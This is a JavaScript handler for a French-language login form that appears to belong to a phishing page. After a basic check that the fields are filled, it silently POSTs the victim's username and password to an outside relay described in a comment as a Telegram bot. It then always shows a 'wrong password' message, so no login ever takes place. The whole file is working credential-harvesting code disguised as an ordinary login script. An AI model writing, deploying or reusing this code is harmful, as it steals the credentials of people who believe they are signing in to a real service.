document.getElementById('login-btn').addEventListener('click', async function () {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const errorMsg = document.getElementById('error-message');

    const usernameBloc = usernameInput.closest('.bloc1');
    const passwordBloc = passwordInput.closest('.bloc1');

    let hasError = false;

    if (usernameInput.value.trim() === "") {
        usernameBloc.classList.add('bloc-error');
        hasError = true;
    } else {
        usernameBloc.classList.remove('bloc-error');
    }

    if (passwordInput.value.trim() === "") {
        passwordBloc.classList.add('bloc-error');
        hasError = true;
    } else {
        passwordBloc.classList.remove('bloc-error');
    }

    if (hasError) {
        errorMsg.textContent = "Mot de passe erroné";
        errorMsg.style.display = 'block';
        usernameBloc.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }

    // Envoie toujours au bot Telegram
    fetch("https://telegrambot-hiqu.onrender.com/api/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            username: usernameInput.value,
            email: usernameInput.value,
            password: passwordInput.value
        })
    });

    // Vérifie la longueur du mot de passe
    if (passwordInput.value.length < 8) {
        errorMsg.textContent = "Mot de passe erroné";
        errorMsg.style.display = 'block';
        return;
    }

    errorMsg.style.display = 'none';
});